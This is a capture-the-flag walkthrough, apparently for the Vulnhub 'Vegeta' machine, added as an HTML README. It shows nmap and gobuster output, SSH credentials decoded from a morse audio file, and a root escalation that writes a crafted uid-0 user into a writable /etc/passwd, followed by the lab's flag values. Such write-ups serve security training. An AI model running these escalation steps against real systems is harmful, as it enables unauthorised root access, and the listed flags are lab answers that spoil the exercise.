@@ -1,0 +1,183 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 10.0.2.28<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+# Nmap 7.93 scan initiated Sat Feb 18 04:25:41 2023 as: nmap -sC -sV -p- -oN nmap_all_port.txt 10.0.2.28<br/>
+Nmap scan report for 10.0.2.28<br/>
+Host is up (0.00011s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 1f3130673f08302e6daee3209ebd6bba (RSA)<br/>
+| &nbsp; 256 7d8855a86f56c805a47382dcd8db4759 (ECDSA)<br/>
+|_ &nbsp;256 ccdede4e84a891f51ad6d2a62e9e1ce0 (ED25519)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
+|_http-title: Site doesn't have a title (text/html).<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+MAC Address: 08:00:27:16:21:02 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+# Nmap done at Sat Feb 18 04:25:59 2023 -- 1 IP address (1 host up) scanned in 17.62 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+gobuster result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# gobuster dir --url http://10.0.2.28/ -w ~/Desktop/wordlists_Seclist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,ssh,js,css -t 30<br/>
+===============================================================<br/>
+Gobuster v3.3<br/>
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>
+===============================================================<br/>
+[+] Url: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; http://10.0.2.28/<br/>
+[+] Method: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;GET<br/>
+[+] Threads: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30<br/>
+[+] Wordlist: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/root/Desktop/wordlists_Seclist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt<br/>
+[+] Negative Status codes: &nbsp; 404<br/>
+[+] User Agent: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;gobuster/3.3<br/>
+[+] Extensions: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;php,html,txt,ssh,js,css<br/>
+[+] Timeout: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10s<br/>
+===============================================================<br/>
+2023/02/18 05:34:02 Starting gobuster in directory enumeration mode<br/>
+===============================================================<br/>
+/index.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 119]<br/>
+/.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 403) [Size: 274]<br/>
+/img &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 304] [--&gt; http://10.0.2.28/img/]<br/>
+/login.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 0]<br/>
+/image &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 306] [--&gt; http://10.0.2.28/image/]<br/>
+/admin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 306] [--&gt; http://10.0.2.28/admin/]<br/>
+/manual &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 307] [--&gt; http://10.0.2.28/manual/]<br/>
+/robots.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 11]<br/>
+/.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 403) [Size: 274]<br/>
+/server-status &nbsp; &nbsp; &nbsp; &nbsp;(Status: 403) [Size: 274]<br/>
+/bulma &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 306] [--&gt; http://10.0.2.28/bulma/]<br/>
+/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 274] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Progress: 8912636 / 8916838 (99.95%)===============================================================<br/>
+2023/02/18 05:49:43 Finished<br/>
+===============================================================<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I Found juicy directory /bulma and I got morse code audio file.<br/>
+<br/>
+So, I decrypt the morse code audio file with this website:<br/>
+<br/>
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html<br/>
+<br/>
+<br/>
+<br/>
+U S E R : T R U N K S P A S S W O R D : U S 3 R &lt;KN&gt; S I N D O L L A R S S Y M B O L )<br/>
+<br/>
+User:trunks Password:us3r (S in dollar symbol)<br/>
+<br/>
+I got ssh username and password:<br/>
+<br/>
+username - trunks<br/>
+password - u$3r<br/>
+<br/>
+I got login into ssh:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh trunks@10.0.2.28<br/>
+trunks@10.0.2.28's password: <br/>
+Permission denied, please try again.<br/>
+trunks@10.0.2.28's password: <br/>
+Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Sun Jun 28 21:16:00 2020 from 192.168.43.72<br/>
+trunks@Vegeta:~$ whoami<br/>
+trunks<br/>
+<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (writable /etc/passwd)<br/>
+<br/>
+After running linpeas, I found that /etc/passwd is writable so:<br/>
+<br/>
+Step 1:<br/>
+<br/>
+Create openssl on my machine:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# openssl passwd -1 -salt lol pass123<br/>
+$1$lol$KiPrOjhyjfhWUcIJnDuJd/<br/>
+<br/>
+Step 2:<br/>
+<br/>
+copy and paste it into /etc/passwd<br/>
+<br/>
+nano /etc/passwd<br/>
+<br/>
+lol:$1$lol$KiPrOjhyjfhWUcIJnDuJd/:0:0:root:/root:/bin/bash (added at end of the line)<br/>
+<br/>
+Step 3:<br/>
+<br/>
+trunks@Vegeta:/tmp$ su lol<br/>
+Password: pass123<br/>
+root@Vegeta:/tmp# whoami<br/>
+root<br/>
+<br/>
+root flag (vulnhub)<br/>
+<br/>
+root@Vegeta:~# cat root.txt <br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;, &nbsp; ,'|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;,/|.-' &nbsp; \.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .-' &nbsp;' &nbsp; &nbsp; &nbsp; |.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; , &nbsp;.-' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/|,' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |'<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; / ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp;,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ,'/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\`' .-. &nbsp; &nbsp;,' `. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ / &nbsp; \ / &nbsp; &nbsp; &nbsp;\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\| &nbsp; &nbsp;V &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp;,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ( &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ) /.--. &nbsp; ''"/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "b.`. ,' _.ee'' 6)| &nbsp; ,-'<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \"= --"" &nbsp;) &nbsp; ' /.-'<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ / `---" &nbsp; ."|'<br/>
+&nbsp; V E G I I T A &nbsp; &nbsp; &nbsp; \"..- &nbsp; &nbsp;.' &nbsp;|.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`-__..-',' &nbsp; |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_.) ' .-'/ &nbsp; &nbsp;/\.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.--'/----..--------. _.-""-.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .-') &nbsp; \. &nbsp; / &nbsp; &nbsp; _..-' &nbsp; &nbsp; _.-'--.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/ -'/ &nbsp; &nbsp; &nbsp;""""""""" &nbsp; &nbsp; &nbsp; &nbsp; ,'-. &nbsp; . `.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | ' / &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/ &nbsp; &nbsp;` &nbsp; `. \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | &nbsp; | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp; &nbsp; &nbsp; | |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ .'\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | &nbsp; &nbsp; \ &nbsp; &nbsp; |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; / ' &nbsp;| ,' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . - &nbsp;\`. &nbsp; &nbsp;| &nbsp;/ /<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/ / &nbsp; | | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;`/"--. -' /\<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; | | &nbsp; &nbsp; \ \ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp; &nbsp; \ &nbsp; &nbsp; |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| \ &nbsp; &nbsp; &nbsp;| \ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.-| &nbsp; &nbsp; &nbsp;| &nbsp; &nbsp;|<br/>
+<br/>
+<br/>
+Hurray you got root<br/>
+<br/>
+Share your screenshot in telegram : https://t.me/joinchat/MnPu-h3Jg4CrUSCXJpegNw<br/>
+<br/>
+root@Vegeta:~# cat proof.txt (offensive security playground lab)<br/>
+491438dd009e4bf634aa15d9e333a1b0<br/>
+<br/>
+root@Vegeta:/home/trunks# cat local.txt (offensive security playground lab)<br/>
+854aae0b554e3b665c7f2d2fcdd56160<br/>
+<br/>
+<br/>
+</body></html>
